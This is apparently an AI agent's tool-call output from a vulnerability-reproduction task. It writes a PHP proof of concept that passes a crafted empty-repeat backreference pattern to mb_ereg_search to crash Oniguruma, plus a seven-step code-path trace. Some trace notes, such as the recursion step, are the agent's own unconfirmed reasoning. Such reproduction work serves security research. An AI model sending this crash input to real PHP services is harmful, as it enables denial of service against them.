from pathlib import Path
p=Path('poc6.php')
p.write_text('<?php mb_regex_encoding("UTF-8"); mb_ereg_search_init("aaaa"); var_dump(mb_ereg_search("(?<x>(?:()|())*)\\2")); ?>')
trace=[
 {"step":1,"file":"ext/mbstring/tests/mb_ereg_search_named_subpatterns_1.phpt","function":"<global>","line":11,"var":"pattern","code":"mb_ereg_search('(?<wsp>\\s*)(?<word>\\w+)(?<punct>[？！])');","note":"The mbregex search API accepts named groups and quantified subpatterns supplied directly by the user."},
 {"step":2,"file":"oniguruma/src/regint.h","function":"<global>","line":63,"var":"USE_STUBBORN_CHECK_CAPTURES_IN_EMPTY_REPEAT","code":"#define USE_STUBBORN_CHECK_CAPTURES_IN_EMPTY_REPEAT","note":"This build enables the empty-repeat capture-tracking path that is implicated in the crash report."},
 {"step":3,"file":"oniguruma/src/regcomp.c","function":"tune_quant","line":5457,"var":"qn->emptiness","code":"qn->emptiness = quantifiers_memory_node_info(body);","note":"A zero-minimum quantifier causes the compiler to inspect the repeated body for emptiness and capture effects."},
 {"step":4,"file":"oniguruma/src/regcomp.c","function":"quantifiers_memory_node_info","line":4894,"var":"node","code":"switch (NODE_TYPE(node)) {","note":"The walker recursively traverses user-controlled AST nodes such as alternation, quantifiers, and capture groups."},
 {"step":5,"file":"oniguruma/src/regcomp.c","function":"quantifiers_memory_node_info","line":4935,"var":"NODE_BODY(node)","code":"if (NODE_IS_RECURSION(node)) { return BODY_MAY_BE_EMPTY_REC; }","note":"Recursive capture bodies are classified specially, steering compilation into the empty-repeat memory-state path."},
 {"step":6,"file":"oniguruma/src/regexec.c","function":"STACK_EMPTY_CHECK_MEM_REC","line":2063,"var":"stack inspection","code":"#define STACK_EMPTY_CHECK_MEM_REC(isnull,sid,s,reg) do { ... }","note":"The emitted empty-repeat code later reads the recursion-aware stack state, matching the issue's runtime sink."},
 {"step":7,"file":"ext/mbstring/php_mbregex.c","function":"_php_mb_regex_ereg_search_exec","line":1438,"var":"search regex","code":"err = _php_mb_onig_search(MBREX(search_re), str, str + len, str + pos, str + len, MBREX(search_regs), 0);","note":"The revised payload forces the search engine to compile and execute a quantified empty capture/backref pattern in the vulnerable mbstring pathway."}
]
Path('candidate_trace.json').write_text(__import__('json').dumps(trace))
PY
cat /workspace/candidate_trace.json && echo '
---SUBMIT---' && true` executed with exit code 0.
